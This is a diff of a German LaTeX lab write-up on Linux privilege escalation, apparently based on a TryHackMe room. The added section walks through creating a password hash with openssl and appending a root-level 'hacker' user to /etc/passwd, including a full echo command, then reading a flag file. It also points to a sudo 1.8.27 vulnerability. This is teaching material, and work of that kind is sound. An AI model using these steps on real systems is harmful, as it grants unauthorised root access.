@@ -541,7 +541,7 @@
         \item[2.] Den Code des Skriptes im Editor einfügen und als scan.sh speichern.
         \item[3.] \textit{chmod +x scan.sh}  in die Kommandozeile eingeben, um die Rechte zu ändern und die Datei ausführbar zu machen.
         \item[4.] \textit{bash scan.sh}  anwenden, um die Datei und somit das Skript auszuführen.
-        \item[5.] Alternativ können die Rechte der Datei /etc/passwd auch mit dem Befehl \textit{ls -la /etc/passwd} und die Sudo Version mit \textit{sudo --version} abgefragt werde.
+        \item[5.] Alternativ können die Rechte der Datei /etc/passwd auch mit dem Befehl \textit{ls -la /etc/passwd} und die Sudo Version mit \textit{sudo - -version} abgefragt werde.
         Weitere Recherchen auf \href{https://www.exploit-db.com/exploits/47502}{exploit-db} oder auf \href{https://www.cvedetails.com/cve/CVE-2019-14287/}{CVE Details} zur Sudo Version 1.8.27 ergeben eine mögliche Schwachstelle.
     \end{enumerate}
 
@@ -559,6 +559,36 @@
 
     \subsubsection{Privilege Escalation unter Ausnutzung der /etc/passwd Datei}
     \label{subsubsec:privilegeEscalation1}
+    Nachdem mögliche Schwachstellen bereits aufgedeckt wurden, gilt es diese nun auszunutzen.
+    \parencite{privilegeEscalationRaumTryHackMe} beschreibt in seinem Wie der \href{https://tryhackme.com/jr/t1mth3h4ck3rb0y}{\textbf{TryHackMe Raum}} im anschaulich wie einer neuer Nutzer in die /etc/passwd Datei eingefügt werden kann.
+    Kurz und prägnant zusammengefasst, sind folgende Schritte auszuführen:
+
+    \begin{enumerate}[leftmargin=2.5cm]
+        \item[1.] \textit{openssl passwd -1 -salt THM password1}  in die Kommandozeile eingeben, um den hash-Wert für das Passwort des neuen Nutzers zu erzeugen.
+        \item[2.] \textit{nano /etc/passwd}  in die Kommandozeile eingeben, um die /etc/passwd Datei im Texteditor nano zu öffnen.
+        \item[3.] \textit{hacker:in Schritt 1. erzeugtes Passwort:0:0:root:/root:/bin/bash}  als neue Zeile einfügen, um einen neuen root Nutzer names Hacker zu erzeugen.
+                Wichtig ist die Verwendung von :/root./bin/bash um eine root Shell zu erzeugen.
+        \item[4.] Die Datei schließe und vorgenommene Änderungen speichern.
+        \item[5.] \textit{su hacker} in die Kommandozeile eingeben, um den Nutzer zu wechseln.
+        \item[6.] \textit{cat SuperSecretFile.txt} in die Kommandozeile eingeben, um den Inhalt der Datei zu sehen.
+        \item[7.] \textbf{Alternativ} kann nach Schritt 1. eine neue Zeile mittels echo Befehl in die /etc/passwd Datei eingefügt werden: \textit{echo 'hacker:'\$1\$THM\$tYgpU9xzsOZ98alD7sjt70':0:0:root:/root:/bin/bash' >> /etc/passwd}
+    \end{enumerate}
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/addUserReadFlag}
+        \caption{Neuen root Nutzer mittels Nano hinzufügen und den Inhalt der SuperSecretFlag.txt auslesen.}
+        \label{fig:privilegeEscalation1Screenshot1}
+    \end{figure}
+    \noindent
+
+    \begin{figure}[H]
+        \centering
+        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/addUserVersion2}
+        \caption{Neuen root Nutzer mittels echo hinzufügen und den Inhalt der SuperSecretFlag.txt auslesen. Da die bash Teils immer noch instabil ist, wird die Zeil falsch dargestellt. Eingegeben wurde der in Schritt 7. angegeben echo Befehl.}
+        \label{fig:privilegeEscalation1Screenshot2}
+    \end{figure}
+    \noindent
 
     \subsubsection{Privilege Escalation unter Ausnutzung Sudo Version 1.8.27}
     \label{subsubsec:privilegeEscalation2}
